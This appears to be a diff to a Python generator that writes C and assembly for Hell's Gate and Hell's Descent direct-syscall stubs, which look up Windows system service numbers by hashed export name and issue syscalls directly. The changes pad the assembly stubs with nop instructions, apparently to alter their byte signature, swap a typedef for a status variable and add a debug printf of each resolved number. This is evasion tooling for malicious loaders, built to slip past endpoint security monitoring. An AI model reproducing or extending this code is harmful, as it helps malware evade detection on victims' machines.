@@ -33,12 +33,20 @@ section .text
 
 HellsGate:
     mov [wSystemCall], ecx
+    nop
+    nop
+    nop
     ret
 
 HellDescent:
     mov r10, rcx 
+    nop
+    nop
     mov eax, [wSystemCall] 
+    nop
+    nop
     syscall
+    nop
     ret
 
 """
@@ -146,7 +154,7 @@ DWORD GetSSN(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, D
 
 
         codeblock += f"""
-typedef PVOID (WINAPI *pfnRtlGetThreadEnvironmentBlock)(HANDLE hThread);
+NTSTATUS status;
 
 __attribute__((constructor)) void {self.name}(){{
 
@@ -172,6 +180,7 @@ __attribute__((constructor)) void {self.name}(){{
             if apicall[0:2] == 'Nt':
                 resolved[apicall] = f"""
     DWORD {apicall}_ssn = GetSSN(pLdrDataEntry->DllBase, pImageExportDirectory, {hex(self.hash_string(apicall))});
+    printf("%s ssn: %d\\n", "{apicall}", {apicall}_ssn);
     HellsGate({apicall}_ssn);
     HellDescent"""
             elif apicall[0:2] in ['Rt', 'Zw']:
